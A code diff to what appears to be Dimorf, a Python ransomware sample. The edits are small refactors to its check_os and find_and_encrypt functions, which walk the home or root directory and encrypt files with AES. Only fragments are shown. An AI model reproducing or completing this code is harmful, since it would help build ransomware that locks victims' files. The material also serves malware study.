@@ -2,10 +2,12 @@
 # -*- coding: utf-8 -*-
 # pylint: skip-file
 
+
 __author__ = 'Wendel Ortiz -> aKa Ort0x36'
 __maintainer__ = 'Wendel Ortiz'
 __credits__ = ['Contributors']
 __module__ = 'dimorf.py'
+
 
 import sys
 import os
@@ -15,7 +17,7 @@ from Crypto.Cipher import AES
 from Crypto import Random
 
 
-def check_os(osname: str) -> str | None:
+def check_os(osname: str) -> bool:
     PATH = os.getenv('HOME')
     
     if (os.getuid() == 0):
@@ -44,6 +46,11 @@ def check_os(osname: str) -> str | None:
             block_bytes=65536
         )
         
+        return True
+    
+    else:
+        sys.exit(f'\33[31mUnsupported python version {sys.version_info}, upgrade to python3.\33[0m')
+    
 
 def find_and_encrypt(
     path: str,
@@ -53,7 +60,7 @@ def find_and_encrypt(
     new_ext: str,
     key: bytes,
     block_bytes: int
-) -> str | bytes | list | None:
+) -> None:
 
     # # go in search of the file.
     for root, dirs, files in os.walk(path):
